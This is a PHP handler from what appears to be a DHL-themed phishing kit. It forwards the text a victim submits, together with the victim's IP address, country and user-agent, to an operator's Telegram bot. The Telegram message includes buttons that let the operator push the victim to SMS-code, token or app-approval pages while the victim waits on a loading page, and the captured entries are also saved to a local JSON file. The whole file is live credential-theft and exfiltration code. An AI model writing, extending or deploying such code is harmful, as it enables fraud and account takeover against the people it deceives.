<?php
// SEND CUSTOM INPUT DATA TO TELEGRAM
require_once(__DIR__ . '/../config.php');
require_once(__DIR__ . '/../includes/get-country.php');

header('Content-Type: application/json');

$input = json_decode(file_get_contents('php://input'), true);
$token = $input['token'] ?? '';
$data = $input['data'] ?? [];

if (empty($token)) {
    echo json_encode(['success' => false]);
    exit;
}

// Get IP and country
$ip = $_SERVER['REMOTE_ADDR'];
$country = getCountryFromIP($ip);
$shortId = substr($token, 3);

// Get custom input value
$customInput = $data['customInput'] ?? '';

// Build message with buttons
$message = "📦 • DHL Express: {$shortId}\n\n";
$message .= "❁═══∘◦ 📝 CUSTOM INPUT ◦∘═══❁\n\n";
$message .= "💬 Response : " . ($customInput ?: 'N/A') . "\n\n";
$message .= "❁═══∘◦❁∘═══∘❁◦∘═══❁\n\n";
$message .= "📡 Adresse Ip : {$ip}\n";
$message .= "🌆 City : {$country}\n";
$message .= "🌐 Country : {$country}\n";
$message .= "🤖 User-agent : " . ($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown') . "\n\n";
$message .= "👇 Where to send user?";

// Add control buttons
$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => '✅ Done', 'callback_data' => "action_{$token}_done"],
            ['text' => '📝 Custom Again', 'callback_data' => "action_{$token}_custom"]
        ],
        [
            ['text' => '📱 SMS', 'callback_data' => "action_{$token}_sms"],
            ['text' => '🔐 Token', 'callback_data' => "action_{$token}_token"]
        ],
        [
            ['text' => '📲 App', 'callback_data' => "action_{$token}_app"],
            ['text' => '🚫 Ban IP', 'callback_data' => "ban_{$token}_{$ip}"]
        ]
    ]
];

sendTelegramMessage($message, $keyboard);

// Save to page tracks
$pageTracksFile = '../store/page_tracks.json';
$pageTracks = [];

if (file_exists($pageTracksFile)) {
    $pageTracks = json_decode(file_get_contents($pageTracksFile), true) ?? [];
}

if (!isset($pageTracks[$token])) {
    $pageTracks[$token] = [];
}

$pageTracks[$token]['custom'] = [
    'customInput' => $customInput,
    'timestamp' => date('Y-m-d H:i:s'),
    'ip' => $ip
];

file_put_contents($pageTracksFile, json_encode($pageTracks, JSON_PRETTY_PRINT));

$result = ['ok' => true];

// Keep user on loading page (waiting for admin command) WITH TOKEN
echo json_encode([
    'success' => $result['ok'],
    'redirect' => '../loading.php?token=' . urlencode($token)
]);
?>

